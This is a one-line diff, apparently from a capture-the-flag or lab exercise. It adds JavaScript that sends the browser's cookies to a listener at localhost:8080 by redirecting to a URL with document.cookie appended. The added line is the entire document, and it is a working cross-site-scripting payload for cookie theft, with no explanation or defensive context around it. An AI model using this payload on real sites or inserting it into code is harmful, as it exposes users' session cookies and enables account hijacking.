@@ -1,0 +1,1 @@
+location="http://localhost:8080/x/FLAG="+document.cookie;
